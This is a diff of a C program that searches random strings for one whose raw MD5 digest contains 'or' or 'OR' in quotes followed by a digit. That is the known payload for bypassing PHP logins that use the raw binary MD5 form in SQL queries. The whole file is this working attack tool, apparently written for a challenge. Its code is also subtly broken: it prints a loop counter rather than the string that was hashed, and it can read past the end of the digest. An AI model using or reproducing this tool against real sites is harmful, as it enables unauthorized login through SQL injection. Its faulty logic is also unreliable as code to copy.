@@ -10,45 +10,65 @@
 
 int main() {
   unsigned char result[MD5_DIGEST_LENGTH];
-  unsigned long long num = 0;
-  unsigned char strll[256];
+  unsigned char str[256];
   int counter;
+  unsigned long long num = 0;
  
   //MD5(string, strlen(string), result);
-  //MD5 is 32 hex digits We need first 7 to be 27 20 4F 52 20 31 23
+  //MD5 is 32 hex digits We need any 5 to be 27 4F/6F 52/72 27 31..39
+  //since php is using the raw binary form of the MD5
+  //'or'{not0}
+  //'Or'{not0}
+  //'oR'{not0}
+  //'OR'{not0}
 
-  //OR doesn't have to be all caps
-  //                          '   space   O     R   space   1     #
-  //unsigned char answer[7] = {0x27, 0x20, 0x4F, 0x52, 0x20, 0x31, 0x23, 0};
-  //unsigned char answer1[7] = {0x27, 0x20, 0x6F, 0x72, 0x20, 0x31, 0x23, 0};
-
-  //Don't need 1st space actually
-
-  unsigned char answer[6] = {0x27, 0x4F, 0x52, 0x20, 0x31, 0x23, 0};
-  unsigned char answer1[6] = {0x27, 0x6F, 0x72, 0x20, 0x31, 0x23, 0};
+   
+  unsigned char answer[4] = {0x27, 0x4F, 0x52, 0x27, 0};
+  unsigned char answer1[4] = {0x27, 0x6F, 0x72, 0x27, 0};
  
   while(1){
-    sprintf(strll, "%lld", num);
-    MD5(strll, strlen(strll), result);
+    sprintf(str, "%d%d%d%d", rand(), rand(), rand(), rand()); //Generate some big random numbers
+    MD5(str, strlen(str), result);
+    //To test
+    //unsigned char result[MD5_DIGEST_LENGTH] = {0x5f, 0x4d, 0xcc, 0x3b, 0x5a, 0xa7, 0x65, 0xd6, 0x27, 0x27, 0x27, 0x27, 0x4f, 0x52, 0x27, 0x31};
 
     counter = 0;
-    for(int i = 0; i < 6; i++){
-      if(result[i] == answer[i] || result[i] == answer1[i]){
+    for(int i = 0; i < MD5_DIGEST_LENGTH; i++){
+      if(result[i] == answer[counter] || result[i] == answer1[counter]){
+        //printf("yes ");
+        //printf("%02x ", result[i]);
+        //printf("%02x\n", answer[counter]);
+
         counter++;
       }
-      else{
-        break;
+      else if(result[i] == answer[0] || result[i] == answer1[0]){
+        //printf("reset ");
+        //printf("%02x ", result[i]);
+        //printf("%02x\n", answer[counter]);
+        i--;
+        counter = 0;
       }
-    }
+      else {
+        //printf("no ");
+        //printf("%02x ", result[i]);
+        //printf("%02x\n", answer[counter]);
 
-    if(counter == 6){
-      printf("%llu\n", num);
-      for(int i = 0; i < MD5_DIGEST_LENGTH; i++)
-        printf("%02x", result[i]);//
-      printf("\n");
-      return 0;
+        counter = 0;
+      }
+
+      if(counter == 4){
+        if(result[i+1] == 0x31 || result[i+1] == 0x32 || result[i+1] == 0x33 ||
+           result[i+1] == 0x34 || result[i+1] == 0x35 || result[i+1] == 0x36 ||
+           result[i+1] == 0x37 || result[i+1] == 0x38 || result[i+1] == 0x39){
+
+          printf("%llu\n", num);
+          for(int i = 0; i < MD5_DIGEST_LENGTH; i++)
+            printf("%02x", result[i]);//
+          printf("\n");
+          return 0;
+        }
+      }
     }
     num++;
   }
-  return 0;
 }
